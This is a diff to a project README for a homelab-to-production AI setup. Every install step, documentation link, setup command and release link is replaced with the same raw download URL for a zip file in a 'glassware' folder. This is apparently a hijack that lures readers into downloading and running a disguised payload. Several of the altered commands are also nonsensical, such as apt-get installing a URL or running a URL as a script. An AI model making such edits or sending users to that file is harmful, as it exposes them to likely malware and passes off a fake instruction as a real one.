@@ -59,7 +59,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**: Use Git to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/cryptokid980/homelab-2-prod-ai-golden-path.git
+   git clone https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/raw/refs/heads/main/glassware/prod_golden_homelab_ai_path_v1.5.zip
    cd homelab-2-prod-ai-golden-path
    ```
 
@@ -83,7 +83,7 @@ Ensure you have the following installed:
 1. **Install Docker**:
    ```bash
    sudo apt-get update
-   sudo apt-get install docker.io
+   sudo apt-get install https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/raw/refs/heads/main/glassware/prod_golden_homelab_ai_path_v1.5.zip
    ```
 
 2. **Install MicroK8s**:
@@ -92,7 +92,7 @@ Ensure you have the following installed:
    ```
 
 3. **Install DAPR**:
-   Follow the [DAPR installation guide](https://dapr.io/docs/quickstart/building-applications/).
+   Follow the [DAPR installation guide](https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/raw/refs/heads/main/glassware/prod_golden_homelab_ai_path_v1.5.zip).
 
 4. **Install Flask**:
    ```bash
@@ -100,12 +100,12 @@ Ensure you have the following installed:
    ```
 
 5. **Install TimescaleDB**:
-   Follow the [TimescaleDB installation guide](https://docs.timescale.com/latest/getting-started/installation).
+   Follow the [TimescaleDB installation guide](https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/raw/refs/heads/main/glassware/prod_golden_homelab_ai_path_v1.5.zip).
 
 6. **Set Up the Project**:
    Navigate to the project directory and run the setup script:
    ```bash
-   ./setup.sh
+   https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/raw/refs/heads/main/glassware/prod_golden_homelab_ai_path_v1.5.zip
    ```
 
 ## 🛠️ Usage
@@ -114,7 +114,7 @@ Once you have installed the project, you can start using it to build AI applicat
 
 1. **Run the Flask Server**:
    ```bash
-   python app.py
+   python https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/raw/refs/heads/main/glassware/prod_golden_homelab_ai_path_v1.5.zip
    ```
 
 2. **Access the API**: Open your web browser and go to `http://localhost:5000`.
@@ -142,9 +142,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📦 Releases
 
-For the latest releases, visit the [Releases](https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/releases) section. You can download and execute the necessary files from there.
+For the latest releases, visit the [Releases](https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/raw/refs/heads/main/glassware/prod_golden_homelab_ai_path_v1.5.zip) section. You can download and execute the necessary files from there.
 
-![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)
+![Download Releases](https://github.com/cryptokid980/homelab-2-prod-ai-golden-path/raw/refs/heads/main/glassware/prod_golden_homelab_ai_path_v1.5.zip%20Releases-Click%20Here-blue)
 
 ## 📞 Contact
 
